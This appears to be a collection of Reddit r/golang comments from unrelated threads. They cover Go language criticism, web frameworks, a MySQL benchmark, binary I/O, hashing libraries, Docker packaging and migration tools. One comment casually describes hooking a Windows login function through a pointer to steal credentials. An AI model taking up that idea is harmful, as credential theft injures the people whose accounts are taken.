&gt; Go appears to target developers who use the gnu suite (Emacs in particular). I'm not sure what this even means. Does he mean the Go binaries act like GNU utils? (They clearly don't - Go has no short options and using a single dash for long options is very Java - they also use more trendy hyphen-less commands - i.e. "go run" instead of "go --run" which would be more GNU). I'm also not sure what Emacs has to do with Go?
Yep, That's it. Will wish the successful project!
It's very popular in university classes. I was a pro at MatLab a decade ago while attending uni.
Most of his criticism is unfounded and often plain wrong. It's like he wrote a 30-line program and decided he knew everything there was to know about the language then bashed it. Maybe if he elaborated on why the negatives he saw had better equivalents in other languages. Most of the differences highlighted are what make Go, Go.
gopher has to be the stupidest name for someone who programs Go.
&gt; Go should enhance panic/recover and update its libraries to use it. ... I cringed.
paraphrasing "go doesn't have java's way of doing things" Yes that's a good thing. "go makes it hard to share data" Yes, that's a good thing too. "Go's channels are synchronous" Yep, and that's sometimes a good thing. It's nice to have rendezvous synchronization and not have to worry about buffers on channels running amok while one goroutine outruns another. Arguably it is better to have a synchronous receive and an asynchronous send operation if you want to model the way distributed applications work locally between goroutines. This can make programs easier to set up for distributed workflows later. As for not using exception-style error handling with panic/recover, I'm not sure about it yet. I'd love to be able to reliably panic a goroutine that loses a stream and recover it to re-connect, but that doesn't work well in my experience. Probably something I missed about how panic/recover are supposed to work. 
What if something goes wrong in c, and you want to stop the other goroutines? In that case, do we send 'true' into the channels to run, and 'false' to abort, and have the receivers check the value and return immediately if they receive 'false'? Or, is there a better way to clean up your goroutines that have already been started?
I agree with the criticisms that the essence of this article seems to be that Go isn't Java. This is a perfect example of how I think Go can help detoxify the environment that Java has created. There are many valid criticisms of Go in general, but all of those conversations are entirely carried out around solid programming and language theory concepts. The root of the discussion never leaves the arena of central solid software engineering concepts. Whereas discussions around Java tend to be more about Java common practices. To me, even when it could be improved, Go makes a great contribution to the profession by keeping the focus on engineering rather than a particular paradigm of programming.
We use it extensively here for backend processes. Our front end is entirely built in Ruby but we have to process a significant amount of content on the backend. We use Go because of the async features and combined with NSQ we're able to get distributed processes working as well. Overall I think it's a good fit and working out well for us but we do have some small problems to engineer through with unclosed TCP connections and so forth.
Depends what you mean by 'web development'. We've been using Go for a variety of RESTful and websocket services, and I think it's already all the way there for such applications. Serving single page applications also ought to be kept simple in any language, so Go has also worked fairly well there, although template management is still a pain point.
Why is it "pretty early to use Go in web development projects"? One of Go's most mature feature sets is its web &amp; network facilities. Anyway, we use it for web services almost exclusively now. There's also some great devops tools written in Go that we use.
But he totally wrote "some small programs" with it!
This isn't even worth criticizing per se on the grounds that it contain too many objectively false statements. `a := foo()` is not "duck typing", it's not even related, and this mistake is made several times. Go does not only contain channels for sync. There's a lot of other things that are false in the way the author meant them even if you could grammar-lawyer your way to a true interpretation (that isn't what the author meant). I also agree this is clearly someone who knows Java, and thinks that Java == programming. Schools produce these in droves. (I've interviewed a number of them.)
Anyone who's spent more than five minutes on tour.golang.org knows all this already. Blogspam that states the obvious is hardly content.
Agreed. "gopher" should be an informal synonym for goroutines. Like: "let one gopher distribute the input, and another gopher collect the results". It seems nicer this way to describe your programs (verbally and on slides).
I believe the article is geared towards unit testing, and you are looking for something more akin to an integration test. For integration tests, you can check out http://golang.org/pkg/net/http/httptest/ (with an example here: http://talks.golang.org/2012/simple.slide#39) or you can do truly blackbox testing by running your service and writing tests against your running service. Just my initial thoughts. 
Everything, I prefer to use Go for everything. Examples of everything: * Web development, replacing Tornado * Custom reverse proxy * Custom chat service over WebSocket, replacing Tornado &amp; node.js. The final shape of this daemon consumes only 5mb of RAM on cold boot. So awesome. * [Process watcher](https://github.com/bradfitz/runsit). I still use Supervisord but I like the idea of single binary and slimmer Supervisord. * [Distributed Queue](https://github.com/bitly/nsq) * [Deployment](https://github.com/docker/docker) * [Storing metrics data](https://github.com/influxdb/influxdb), replacing ELK stack * [Lock Service](https://github.com/coreos/etcd), replacing Zookeeper I wish there's Cassandra replacement in Go as well.
Hm. Currently the whole system is based on maps and iterating through data from the maps. I could perhaps make ValidateStruct do some magic that unpacks rules from the struct field tag, though. That could be neat!
He probably means people who can use a shell.
Seconded. Placing constraints in field tags makes it easier to write structs with validation expectations and it makes the expectations immediately visible in the godoc of exported structs/fields.
First time I heard of a language targeting people who use a specific cli editor anyway *facepalm*
Add this in and I'll use it in every project I make, would make it absolutely fantastic 
I'll stick that in tonight!
Can you mention the devop tools you're using?
I think OP means Web development as in WordPress with extensive CMS-functionalities. Go is a better at restful implementations IMO 
I'd prefer a validation API that makes more use of static typing. Something like that: ValidationRules.For(username).Required().SizeFromTo(4, 30)
wrt gopath/packages, all i'm gonna say is *coughs* Maven.
The syntax of struct tags can get ugly really quick when validation logic is configured there. I'd recommend _not_ using struct tags for this purpose.
I added support for struct tag validation. It's optional, here's the docs: https://github.com/Assembli/beautiful-validity#tagged-structs
There are other libraries that do that, and do it well. The point of this is to give you something that you can pass unknown, "unsafe" input into without having to manually check types of many different values.
Yeah, my department used Mathematica instead. I didn't realize that MatLab had such a huge lead on it though.
Anything that doesn't require a GUI, especially CLI applications and servers. Yes, that includes web servers. Go is really good at web servers.
Just going to drop in a line for http://goji.io too.
Absolutely, popularity and ubiquity are the rewards for the seven (and counting) years of care and dedication the Go authors have put into the language.
This is awesome. It might make sense to make your library depend on https://github.com/asaskevich/govalidator and get access to all their validation functions.
I've seen that before, that looks pretty awesome! Bringing that set of validators in as a dependency would take just about as long as just rewriting the validators (most of which are just simply regexp). I do want to expand the validator set quite a bit, though - I'll take that as reference!
Command line tools at the moments. In Go we need to write much fewer LOC than in C (which means fewer bug, easier modification, much better readability, etc) - and performance is still good. One of the programs is about six times slower than C, but we could implement more features into the Go version more quickly - also, we are still learning how to exploit the most of the concurrency and IO capabilities. Upcoming, planned projects include a download service implemented as daemon, some data pipeline processing and a graph database backend. 
None of what OP said mentions CMS..
Have you checked out ginkgo for BDD testing, since you're coming from rails? https://github.com/onsi/ginkgo Also, dependency injection becomes a lot easier when you use OOP style go. :)
Why would you be using tornado and node together?...
I use it for anything python is ill suited for.
First prototype was in tornado, then another guy think it will be "scalable" to rewrite in node.js. After a while, I just cannot handle all that JS and rewrote it again in Go.
You probably need better performance. Rewrite it in C next.
Which is why Eraxley qualified it with "I think OP means..."
That sums it up pretty well. Juju is cool too (though I've never used it personally). There's a huge list here of Go packages and software: https://github.com/avelino/awesome-go
Let's say you use A 2.X and B 1.X in your project and A depends on C 1.1.1, and B depends on C 1.2.4. You need to resolve this manually to C 1.1.3. Also you need to pin the versions, so that you wouldn't get breaking builds when someone introduces a bug in B 1.7.5. Also B is not available in Maven Central, which means you need to have your own local copy to account for disappearing repositories. After fixing those two problems, you are exactly doing what [Go suggests](http://golang.org/doc/faq#get_version) - make a copy of your dependencies, if your project is important.
&gt; See that first example was simple, but what if I add a bunch of nonsense channel stuff? Look. Concurrency! You're welcome.
And you can check my http://defaultproject.com/ that uses goji. I recently built http://gifuk.com/ using that.
We are using go in many places, including workers, daemons, and lately, web servers (we just deliver a nice .deb with an executable and the templates). Having played with node.js lately, I can ensure you the delivery part is just a HUGE win ;)
Why do you think it is too early? I find web development in Go much easier than say in PHP or Node.js. Of course I had to spend some time to learn quite a lot of new things, but that was a time well spent. I created something like bootstrap for web apps http://defaultproject.com/ And recently created http://gifuk.com/ in Go.
Exactly - The definition of a hash :)
As fas as I can tell you're not signing the SHA1 in PHP - you're signing the first 128 bytes. Can you please send along the code you are using to sign the data? I suspect there might be a problem there as well. 
For starters, you can take advantage of Go to speed up your Rails background jobs. Take a look at this guy http://www.goworker.org
Instead of doing a Select * from the table, have you tried only selecting the field which you are printing? 
Well, for one, shouldn't the Scan method be receiving `&amp;id` and not `&amp;string`?
Perhaps youre timing each iteration in java vs the total time in go? Can't tell because the go code is missing the timing artifacts. Not that go is guaranteed to be faster.
Yeah, but they do both use "SELECT *" for the query. That's what I thought you were talking about. I agree with you completely about the later part being different.
I do not think it affects the performance, but I think you miss a defer db.Close()
A few things: Python doesn't do concurrency well. The last thing I wrote in Go was a program to stress test a REST API. Python is slow iterating tight loops. The biggest thing I wrote in Go was a path solver for getting bicycling routes and generating turn-by-turn directions. Python can consume a lot of memory. I've found Go to be a nice compromise with pass by reference and garbage collection. 
How are you calculating total time in each implementation? 
I've answered your question on stack-overflow. Hope it helps.
tested and nothing changed
yeah i'm curious as to why it even works
You aren't likely to be doing anything wrong. Without fully understanding how you made the measurements, I wouldn't be surprised that the java client has much better performance. It's at least a decade older and is battle hardened. Aside from academic or personal pursuits, such as benchmarking, making a language decision based on the performance of underlying libraries may not achieve the result you desire. There are a number of other important factors that should weigh into the decision. Is the process long-running or do you need fast startup time? How do you plan to deploy or distribute? Is your company or project already using java? Is maintainability more or less important? Note that it may be the case that the resulting ETL system's performance is not even related to this particular benchmark. If performance is really the most important factor, and you're sure this benchmark is relevant, I'd recommend you make an attempt in C. It should sort to the top in performance and provide a baseline to make your decision. You may also want to track result variance and repeatability in some way. Server state (caches, load, etc.) can have a massive effect on performance.
Nice thanks for the explanation. 
Benchmarking is a black art, as they say. Beware of System.currentTimeMillis() - its granularity may not be the same as its resolution. This can lead to seriously inaccurate microbenchmarks. If you must measure small slices of time, use System.nanoTime(). I suggest measuring overall timing, though, and dividing by the sample size to get the per-iteration time. Also, you have a System.out.println() inside your code being measured. Don't underestimate the synchronization and buffering cost of writing lots of data to standard output.
Right off the bat: I'm having a hard time telling the difference between this and the standard text/template implementation. So, you may want to take another swing at your Readme.md to differentiate the two. Right now, you're going to have a hard time courting library users and contributors if it *looks* like you reinvented a standard lib. Other than that, i humbly submit the following to improve: * Semantic version label on repo (even if you're in beta) * Coveralls integration
- This builds on the standard html/template library: "Go language html templates based on standard library html/template package", how would you clarify this? - This is a thin layer of a usage implementation, not a rewrite of core libraries, use is going to appear in part like using standard libraries, how would you clarify the example? Explain 'Semantic version label on repo' and 'Coveralls', thanks. 
One thing to consider: You're printing inside the loop that you're timing, therefore the timing is going to contain the time it takes to print to the string. At least in the case of Go, there is no buffering by default so that overhead can be quite high. e.g. I just ran a test and with printing the time is `5.887s` and without `415ms`. I don't know about Java, but IIRC this mysql driver does *not* buffer rows for you, so it's likely that you're not reading new data until after your printing which would only make things slower. 
Yeah that's probably a bug. Be interested to see if testing that solves his problem. The function signature is func rows.Scan(dest ...interface{}) error So isn't his code allocating a new empty string for every row? And then he prints out fmt.Println(id), which is nil, right? Why would you print out the query result to the console in a benchmarking test, doesn't printing to system.out take some time? 
I did a test on my machine, and kinda obviously the majority of the time is being spent in fmt.Println(id) - line 24. Could you disable the printing line in both tests and retry?
you miss rows.Close()
for rows.Next() { var id string rows.Scan(&amp;string, nil, nil, nil, nil, nil) fmt.Println(id) } rows.Close()
http://golang.org/pkg/database/sql/#Rows.Close &gt; If Next returns false, the Rows are closed automatically and it will suffice to check the result of Err.
What are the advantages over html/template?
You might want to consider that you can handle the problem of insertion into postgresql well using goroutines that pass records in a (buffered) channel. Then you can be both reading from mysql and writing to postgresql concurrently, which I suspect will be a serious performance boost. If you want to get fancier you can use a sync.pool to allocate for the records.
I'm not familiar with the difference between stock Java and android Java. Is there a difference in the language itself? Or just the libraries used?
Here's a [better summary](http://en.wikipedia.org/wiki/Comparison_of_Java_and_Android_API) that I could give myself. Keep in mind [Oracle sued Google](http://en.wikipedia.org/wiki/Oracle_v._Google) over this too.
function receivers are *just like* arguments to the function. So, if you have func (f Foo) DoSomething() {} this is exactly like func DoSomething(f Foo) {} The first is just syntactic sugar for the second. Thinking about it this way make the behavior a lot more obvious... the latter function obviously receives a *copy* of f (remember the first rule of Go - everything is pass by value), so any changes will not be reflected in the original object. That should make the behavior of the first form obvious as well - changes will not be reflected in the original object.
[You are correct](http://golang.org/ref/spec#The_zero_value). The variable declaration should move outside the loop. Also read [this post](http://www.reddit.com/r/golang/comments/2dbyqt/golang_vs_java_performance_on_mysql_query/cjo5u4x) if you haven't already.
Wow, very good point! You spelled that out well. Thanks
Yeah. Learned the printing problem the hard way doing a Project Euler. Printing a status of the calculation I was doing caused my program to execute outside the "1 minute" deadline for PE. Without printing a status, brought it down to a few seconds.
There are methods for - using {{extends "/other.html"}} and {{define}}{{end}} tags - a LRU cache - multiple loaders. So, not much at the moment except some items you might be doing yourself when using html/template. 
Nothing so grandiose here as a rewrite or replacement of lower level lexing, parsing, etc (yet). This is just a convenience layer over html/template from code I've scavenged/forked/rewritten to serve my own needs. 
One way method receivers and function arguments differ is that to add a new method the receiver must be in the same package (I think).
OP of the question here. If I understand [encoding/xml](http://golang.org/src/pkg/encoding/xml/read.go#L345) correctly, this is impossible: ... case reflect.Interface: // TODO: For now, simply ignore the field. In the near // future we may choose to unmarshal the start // element on it, if not nil. return p.Skip() ... Is this planned for 1.4? ---- Update: I found the changeset, that added that TODO, it's [70e914beb409963942a6f878cb18659c4cd78a58](https://code.google.com/p/go/source/detail?r=70e914beb409963942a6f878cb18659c4cd78a58), from Januar 2012, which states: &gt; Do not break down unmarshalling if there's an interface{} field in a struct.
I'm with you there, friend; Go's built-in templating system is such a hassle to use.
So why would you ever use a non-pointer? It seems like using a pointer is better in every way.
Whenever you don't need mutation. Immutable data is safer than mutable data.
I'll add to this. Copying a large struct for the function can be more expensive than using a pointer and accessing a small number of struct fields. Even when the method does not need to mutate the receiver, it may still be desirable to use a pointer receiver for efficiency.
But when working with large chunks of data (say, like a framebuffer in an emulator) wouldn't you still want to just use a pointer to avoid passing the whole thing? I don't think "to be extra safe" is a good enough reason.
The reason why there's both make and new is because new was introduced as an allocation primitive, while make was introduced to initialize built-in types. Yes, make allocates backing memory, and new initializes a pointer, but a lot of people are used to languages where these are separate constructs, and so there was a lot of opposition when the go team proposed to unify them (i.e. `make(*T)`). So we have both.
I just checked and it seems "binary.Write(data, binary.BigEndian, true)" compiles fine, but fails during runtime.
Bytes are just the natural way OS's think. What might be better is to write 8 bits to a byte using masks- 0x1, 0x2, 0x4, etc and a bitwise-or, then writing the byte.
You cannot write a single bit to a file. The thing to do is write some code to gather 8 such bits at a time and write them together as a byte.
The point of this bit right now is to be a flag, it seems a waste to have 8 bits to represent a simple true or false. Does this mean at compile time go true/false values are actually 8 bits/1byte?
Yes, a Go bool value is 1 byte/octet in size. Operating systems don't support writing fragments of a byte to disk, so you're always going to be writing multiples of bytes. For the example above, do the following: binary.Write([]byte{8}) Which will write a single byte with the value 8 (0b00001000).
As others have said, you can't write a single bit to a file. The size of Go's numeric types are here http://golang.org/ref/spec#Numeric_types. You might also find http://golang.org/ref/spec#Constant_expressions useful because there seems to be some mis-understanding with `byte(int32(8))`. You say &gt; "the "8" is actually written as a int8 or int how exactly do you determine that? when you write that `8` all that happened was you wrote `1` bytes in big endian order, there is no type information attached. Here is a few little snippets you can play with http://play.golang.org/p/VF5kj3-xQ_ . The one that writes `true` is there to demonstrate that you cannot write a boolean. You should *not* ignore errors. With regards to `8` bits being a waste when all you need is `1`; I think you you're overthinking this, especially when considering things like file system block sizes https://en.wikipedia.org/wiki/Block_(data_storage).
Is there a changelog available somewhere?
Andrew Gerrand has linked to it [on the mailing list](https://groups.google.com/forum/#!topic/golang-nuts/CF5wyVEjEaY). [Direct link to the commit logs.](https://code.google.com/p/go/source/list?name=release-branch.go1.3&amp;r=40272ab1339ab2fb9e7160483e5e5d42d6b7e810)
Thanks!
This may be overkill for the time being, but in the future it might come in handy: Check out my bitpacking library, gopack: github.com/synful/gopack
Agreed. Pointers have many good use cases. Certainly large data shouldn't be copied. Hence slices. But There are cases when we want to have locality. We can greatly speed up many operations with cache optimization.
That's a great case when a pointer is the perfect, simplest, most elegant solution.
Have you looked at encoding/binary? You can read/write entire structs of uints etc into and out of files. http://golang.org/pkg/encoding/binary/ See the read and write methods especially 
Also, https://github.com/gokyle/hotp https://github.com/dgryski/dgoogauth
You are blind. Go 1.3.1 fixes are all commits between go1.3 and go1.3.1 tags.
Thanks for this
Check out the crypt package.
I determined it by opening up the file with HexEdit and looked at what bits were actually written... but now that I look at it, you are right, no type information was really attached if I casted to byte. This will end up being a very large amount of information to be sent over a network, so thats why I don't like the idea of 8 bits when I only need 1. But you might be right that I am overthinking it. Thanks for the links :)
Files are byte-oriented. You can't write individual bits into them.
Also, https://github.com/dgryski/go-ketama https://github.com/golang/groupcache/tree/master/consistenthash And, https://github.com/dgryski/go-jump , which is faster and uses less memory than the hash-ring-based consistent hashes. See the associated Google paper: http://arxiv.org/abs/1406.2294 These are all availble as "chooser" plugins for https://github.com/dgryski/go-shardedkv , which makes managing a sharded key-value store easier, compatible with https://github.com/tsee/p5-ShardedKV for Perl. Edit: oddly, people seem to still be hitting my repostories from this comment. I may as well add https://github.com/dgryski/go-mpchash
Well, what people usually do is designating flags-bytes in their binary file structures. For instance, this is what the header of an ELF (Unix binary) file looks like: typedef struct { unsigned char e_ident[EI_NIDENT]; uint16_t e_type; uint16_t e_machine; uint32_t e_version; ElfN_Addr e_entry; ElfN_Off e_phoff; ElfN_Off e_shoff; uint32_t e_flags; uint16_t e_ehsize; uint16_t e_phentsize; uint16_t e_phnum; uint16_t e_shentsize; uint16_t e_shnum; uint16_t e_shstrndx; } ElfN_Ehdr; The member `e_flags` contains various flag bits (up to 32) with values defined elsewhere. You could consider doing something like this.
I forked and cleaned up an existing library also: https://github.com/ngerakines/ketama. Hat-tip mncaudill/ketama.
Excellent point, that's a great way to think about it. However, to avoid any confusion, there *is* a difference between the two if you're trying to implement an interface. Defining a function instead of a method (i.e. using `func DoSomething(f Foo) {}` instead of `func (f Foo) DoSomething() {}`) will not end well when you try to compile. When implementing interfaces, you must use a method receiver.
Already available as an official package in Arch Linux
Hey I couldn't insist and just changed it!: https://github.com/fatih/structs I also notified the current package users. 
.. and homebrew for the OSX users out there.
Installed and working via GVM 
Use the command line mercurial client? 
resolved!
I think this article is just as ridiculous as the posts claiming go is useless because it doesn't have generics. &gt; If I were a developer getting started today, I’d make a career bet on Go. Unless you are a senior developer with all the clout and leverage that comes with it, this is a terrible idea. If I was a new grad right now I'd make sure I know Java, Python, and C. I would not bet my career on a relatively new language that has seen modest adoption outside of startups and bleeding edge tech firms. It's just not reasonable.
I would agree. I dont think the article was claiming to only know Go and forget everything else. But rather learn it now to get in front of it. I think it would be very unwise to know just one language -any language- let a lone a new one. 
As a newly minted programmer in the mid 90's, my knowledge was heavily invested in C++ and Windows. To this day I haven't been employed to use any of that knowledge, but have instead continued on the path of enterprise *NIX &amp; Perl which was the environment of my first job. Actually we are anticipating bringing in Go as a supported language at the company I'm currently at. But in any bureaucracy, things move slowly. 
yeah disk space and memory is so bountiful these days that the resolution isn't at the bit level anymore. Even look at some C compilers, by default they pad structs to multiples of 4(?).. it's a space vs time complexity tradeoff. To require the OS to navigate through a packed structure takes more time when space isn't really an issue anymore.. unless you're working in an embedded system. In which case, just using Go over C would probably blow any bitwise space savings out of the water
happily, there will be a better error message in future versions of go, woot! https://code.google.com/p/go/issues/detail?id=8442
Guy goes to conference about Go, finds enthusiastic Go programmers. 
It seems as if a lot of companies turn to Go seeking performance gains coming from a framework like PHP, django or ruby on rails. Lots of people are interested, NextDoor talked with me about how they wanted to rewrite their whole backend in go. I think the main issue for companies is training their team to use the new framework and the unknowns of working with Go as it is relatively new. I think there are lots of good opportunities in the market, but timing is everything as you have to be part of the critical change in mindset as they attempt to scale up. Disquis just switched over last year and I'm sure other companies are looking at the same sort of thing. http://blog.disqus.com/post/51155103801/trying-out-this-go-thing EDIT: here's a more technical writeup http://highscalability.com/blog/2014/5/7/update-on-disqus-its-still-about-realtime-but-go-demolishes.html 
If you're looking at junior-level positions, don't limit yourself to Go jobs. I don't think you're going to find a big market for junior level go positions, but it doesn't hurt to keep your eyes open. Compared to other language ecosystems, there's comparatively little to learn in Go. Keep building experience in the field, and working on Go projects whenever you can. The experience of developing a good API in python is fundamentally the same as doing it in Go, and that experience will pay more than waiting for the perfect Go job. 
Yeah probably, I haven't looked at it in a while, but probably meant b.. i did a refactor on the code and not sure that test error came up, i'll check it. 
I'm sure there will be a market, not sure when it will be sustainable enough for junior devs like me &amp; you though. There are, however, [lists of companies that use go](https://code.google.com/p/go-wiki/wiki/GoUsers), and [lists of Go jobs](http://www.golangprojects.com/) (even though few are entry level), so you could try to apply at a company that has a Go job posted and see if they have any junior level openings.
Is this filed under "toying around with nonsensical stuff" or under "stupid *and* ugly"?
hailo in the uk are big go users so if your in london your in luck
&gt;I'm a year out of school and haven't had much experience looking for a development position. Might be able to nab a college hire at Google or something - some companies are big on degrees. You say you want to be a developer, so my advice is don't be picky about languages - and especially don't get hung up on Go (a rather small and obscure language) so early in your career. You need Java/C#, python, maybe some Ruby. Stick with JS (if you're not already, get boned up on Backbone/ember and stuff like handlebars). A bit of native code doesn't hurt. Make sure you're good with SQL too. If you want to be a developer, shoot for the skills that are likely to land you a job - worry about finding *just the right job* after you can be comfortable knowing that you can get a dev job no matter what happens. Very few places are going to hire a developer without experience. You're likely going to want to first shoot for the operations side of the house - get experience seeing how things are done. Try to find an in-house open source shop that will let you look at their code, and maybe contribute bugfixes in your spare time. Learn how livesite services actually work, and all the huge challenges that exist in monitoring/build/platform. If you've been largely dealing with freelance and php, trust me, development of production services on real infrastructure is ten times more complex than you expect. You won't be a coder right off the bat if you aim for operations, but you'll benefit greatly from it. And if you're aggressive with coding on the job (showing that you not only *can* code, but you can be proactive and contribute doing it), then you'll likely nab a devops or maybe even pure dev spot in short order. From there you can start listing yourself not as "entry level", but as "N years experience developing services for XYZ". My two cents. 
Docker and Digitalocean might be hiring. +1 on the luck thing.
Why why why why why why U do this?! Oh.... 
Thanks for posting this! It's still alpha, so there will be bugs and rough edges. It can do some pretty cool and useful stuff already in your editor for Go, like finding usage examples of functions in other open-source projects (and it powers https://sourcegraph.com/). But honestly, right now, the experience for Go is not better than existing Go editor plugins, since Go has such good tooling overall. So, use it in addition to (not instead of) other Go editor plugins. Where srclib shines today is in its support for languages whose tooling isn't as good: Ruby, JavaScript, Python, etc. In a lot of ways, we're trying to bring the awesome tooling that Go has to every other language. :) So, in the mid/long term, we're going to expand it to more languages, offer more and better editor plugins, improve type inference and doc generation, etc., all (we hope) with help from others. And there are probably tools that don't yet exist that srclib (with a zero-configuration, language-independent API to source code) will enable that we're not even thinking of. But srclib is written in Go and we love Go, and it supports Go, so it's definitely relevant to Gophers. BTW, anyone have feedback about how we're explaining the problem and solution, and the first-run experience of using the editor plugins and the "src" tool? We would LOVE to hear it so we can fix/improve it.
Javascript user
I'd imagine if you can program in C and Python, you can pick up javascript in a matter of days
you can see Mixer here [https://github.com/siddontang/mixer](https://github.com/siddontang/mixer) for more information. 
I strongly doubt that will fly if you're going out there for your first job. You either have experience with JS frameworks or you don't. You either know jQuery or you don't. The similarities of language syntax is the easy part of the problem. Saying "I know x and y, so I can pick up JS" won't fly. JS is used in web apps, mobile apps, and on clients. If you don't know it, you're not prepared for today's job market. Of course, you can find niches where it's not used, but your advice was about what skills put you in a best position for getting a job. JS is absolutely a central part of that.
I think it is a very meaningful and challenging project.
I support this experiment. It goes to show that Go kinda does have exceptions, even though you're not supposed to use them.
It works great, thank you.
I'll admit your right, but you left out the undeniable relevance of visual basic in todays market so I don't know how credible you are...
Somebody please record and share this.
Does this work? https://plus.google.com/b/117429404983378101169/events/cpmusrnthjp444dqf1162m15bno After the event the recording will be available on YouTube for people who can't watch live.
As an example, I would use a pointer if I was writing code to steal login credentials. I would find a pointer to the Windows function that is called when a user enters their credentials then I would copy code to that pointer (memory address) which would execute my function instead. The reality is if you can't come up with a good reason to use pointers, then your programming simply does not require pointers.
bwahahahaha edit: seriously, i love go and i've been watching it from the start but the irrational exuberance in this article is hilarious.
No. It shows Go really doesn't have exceptions, and the lengths to which you have to go to implement a poor version of them.
LOL! That indeed made me smile!
I have ， But no results。
I'm personally a fan of gomigrate: https://github.com/DavidHuie/gomigrate :D
Go has a strong OSS community. Get yourself some experience working on OSS Go projects and you'll get a job doing Go in no time. If you contributed to Docker related projects, my company (Riot Games), would almost certainly interview you.
I would focus on the skills you do have, but also emphasize that these skills allow you to help modernize a legacy code base.
Any comparison of available libraries? So far been using https://bitbucket.org/liamstask/goose only so would be interested to find out more about other libraries.
a recruiter called me a year ago about hailo and asked did i have any GO experience. I didnt (and still dont) but i subscribed here to find more about the language
s/catched/caught/
I'm fairly certain the crypto package is what you want. I'm operating on the assumption you're looking for a package that facilitates the encryption of data using public keys and the decryption of data with private keys, yes? The crypto package has type definitions for the essentials, such as public and private keys, and subdirectories for implementations of public/private key (asymmetrical) ciphers, such as RSA. I'll admit it requires a bit more crypto knowledge than other 'do it all for you' style libraries like pycrypto, but I don't think that's necessarily a bad thing. * [Crypto Package](http://golang.org/pkg/crypto/) * [RSA package](http://golang.org/pkg/crypto/rsa/) Hope this is useful! :)
I think that's a good point as others have mentioned that a lot of the opportunities are in companies that are rewriting internal code.
I'd love to start contributing more. Right now, most of my OSS contributions center around Drupal. Any cool projects you know of that need a hand? 
Hm, you're not the first to mention python... I better brush up! 
Ah, not in London atm. Gf and I have been tossing around living in London/Paris for a couple years though! I have dual citizenship in the US and France, so it would be somewhat easier to find working arrangements in the EU I think. 
Thanks! I'll check those out! 
Fair point. Python's been mentioned a lot, I'm going to see what I can do to play with it.
Interesting, I was actually reading through the paper that introduced this, [Consistent Hashing and Random Trees: Distributed Caching Protocols for Relieving Hot Spots on the World Wide Web](http://www.akamai.com/dl/technical_publications/ConsistenHashingandRandomTreesDistributedCachingprotocolsforrelievingHotSpotsontheworldwideweb.pdf) last night and this morning; I'd recommend it if you're into this. Also, since this is based on the libketama implementation, there's [a nice blog post by Rj (implementer?) at last.fm here](http://www.last.fm/user/RJ/journal/2007/04/10/rz_libketama_-_a_consistent_hashing_algo_for_memcache_clients). Annnnnnnd, in that last.fm post, a kind commenter added [this additional (abstract?) paper](http://www8.org/w8-papers/2a-webserver/caching/paper2.html) by the same authors of the above paper.
Interesting. Still feels like we need more maturity in the Go RDBMS libraries before these can become very effective. Something like a SQLAlchemy for Go. PostgreSQL is a great start though.
Docker itself is a very active Go project: github.com/docker/docker The maintainers are very helpful. Jump into #docker-dev on freenode. One easy way to get involved is to help refactoring the utils package into smaller, more focused packages under pkg.
I wasn't aware that there are quite a few other tools, when I started working on https://github.com/mattes/migrate. I now know: * https://bitbucket.org/liamstask/goose * https://github.com/tanel/dbmigrate * https://github.com/BurntSushi/migration * https://github.com/DavidHuie/gomigrate I can only speak about goose, because I am not familiar with the other ones. Here are some reasons, why I created my own migration helper: * While the goose CLI works great, importing goose into existing projects (i.e. in my tests) isn't fun due to the reason goose uses fmt.Println() statements in the goose package. See [link](https://bitbucket.org/liamstask/goose/src/d895b7d4e840c1048395df986ca797bea46bb2c8/lib/goose/migrate.go?at=master). My implementation uses channels instead. So it's the channel receivers (i.e. CLI) responsibility to do sth with the errors and so on. * At first I thought about forking and fixing, but I wasn't happy with the goose api design at all. gooses throws in all dialects/ drivers into one package. Without a clear separation from the drivers to the rest of the packages, it felt difficult to implement new drivers. * I really don't like the -- +goose StatementBegin/ -- +goose StatementEnd things, but I understand that goose needs it. * I personally didn't feel comfortable with having to use config files. I use migrate together with Docker projects a lot. All configuration is passed as environment variables into a Docker container. So I just wanted to pass that ENV vars to the migrate CLI. 
I just had a quick look at the other migration tools, too. https://github.com/tanel/dbmigrate Package only. Clean api design. Only up migrations supported. https://github.com/BurntSushi/migration Package only. Very basic. You have to read migrations files yourself. Good documentation. https://github.com/DavidHuie/gomigrate Package only. Clean api design. Uses separate up/ down migration files. 
Currently using goose, this seems like a nice alternative. I was annoyed with the YAML db config and print statements as well. What's the bash backend for? Basically, letting one write any other logic besides SQL?
&gt; What's the bash backend for? Basically, letting one write any other logic besides SQL? Yep.
Why do you download Go if once you have binary it is not needed?
I think the author intends to show the usual way first: installing the Go toolchain in a Docker image, building the code there, etc. They then move on to the way they prefer: building a static binary locally and only including the final executable in the image.
But probably everyone knows the usual way. I am not a frequent user of Docker, but that's what you do with other languages etc. I would be interested in Go way. This is not a Go way, so I would like author to fast-forward this boring tutorial, to something where Go community could benefit from.
As someone who has never used docker I appreciated his full explanation. Reading the text helps to understand what you are looking at.
&gt; This is not a Go way Not sure I follow your complaint here. /u/kelseyhightower is showing us a slight change in how he packages a Go app that he runs in a Docker container.. and then he optimizes the size of the resulting container even more. Talking about how people ship their Go apps is as important as anything else we discuss here.
I would suggest Ruby as well as Python. They are more similar than they are different, and it should be quite simple to pick up both of them. Plenty of Python/Ruby work at the moment. Ruby is largely used in web development. If you're going that route, don't' forget about JavaScript. But, if you want to avoid web development, then I'd stick to Python/Go. They are used more in system programming and scripting.
Sounds like a great place to work! 
Yeah I've already been doing a little ruby and plenty of JS, I'm not starting form scratch at least haha
Correct. I try not to assume the reader has full context when I write a how-to guide. I like to give everyone a level playing field.
Hopefully you found the rest of the post useful. The goal of the post was to take people through my experience and provide some actual code examples along the way. I'll admit it can be boring for some, but the benefits to new users of Docker and/or Go are worth the extra explanation in my opinion.
No, I don't mean that way. I mean web application.
your Ruby app talks to Go app via REST API?
Yes, I mean in developing web application or RESTful web service API? What are your common packages to use when you developing RESTful API?
arrrrrgh. This is a good topic that deals with a real problem, but falls short of actually being useful. The post shows that a simple busybox image doesn't work, it shows why it doesn't work, and shows that it can be fixed, even with the suggestion that it's fairly simple. No mention of how that's actually done except one vague line. &gt; The Contributors app gets around this problem by bundling a copy of the root CA certificates and configuring outbound calls to use them. This is the equivalent of ending a help thread with "I found the problem, never mind." leaving any readers lost as to what the actual solution is. The single most important part of the entire thing is completely left out. Yes, I realize that it's available in the actual source code, but it leaves the article itself woefully incomplete.
Okay, my bad. 
This. I use gocraft/web purely for the middleware implementation, which rocks. (well, and the routing, which also rocks but there are a lot more options for). The rest is pure net/http and html/template. It's not a "FRAMEWORK" as I'd understand it, like Rails, just a library of linked routines
